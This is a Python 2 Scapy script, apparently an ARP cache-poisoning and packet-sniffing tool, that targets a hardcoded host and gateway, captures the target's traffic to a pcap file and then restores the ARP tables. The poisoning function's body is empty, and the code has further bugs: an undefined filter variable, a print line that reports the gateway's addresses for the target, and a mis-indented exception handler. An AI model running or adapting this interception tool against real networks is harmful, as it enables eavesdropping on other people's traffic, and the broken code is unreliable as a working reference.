from scapy.all import *
import os, sys, threading, signal

interface = "en1"
target_ip = "192.168.0.100"
gateway_ip = "192.168.0.1"
packet_count = 1000

# create interface
conf.iface = interface

# disable output
conf.verb = 0


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print "[*] Restoring target..."
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

    # instructs main thread to exit
    os.kill(os.getpid(), signal.SIGINT)


def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address),
                                timeout=2, retry=10)
    # return MAC address from response
    for s, r in responses:
        return r[Ether].src

    return None


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):




print "[*] Initializing %s" % interface

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print "[!] Failed to get gateway MAC - exiting..."
    sys.exit(0)
else:
    print "[*] Gateway %s is @ %s" % (gateway_ip, gateway_mac)

target_mac = get_mac(target_ip)

if target_mac is None:
    print "[!] Failed to get target MAC - exiting..."
    sys.exit(0)
else:
    print "[*] Target %s is @ %s" % (gateway_ip, gateway_mac)

# Begin poisoning thread
poison_thread = threading.Thread(target=poison_target, args=
(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
    print "[*] Starting sniffer for %d packets" % packet_count
    bpf_filter = "ip host %s" % target_ip
    packets = sniff(count=packet_count, filter=bpf, iface=interface)

    # display captured packets
    wrpcap('arper.pcap', packets)

    # restore network
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

except KeyboardInterrupt:
# restore the network
restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
sys.exit(0)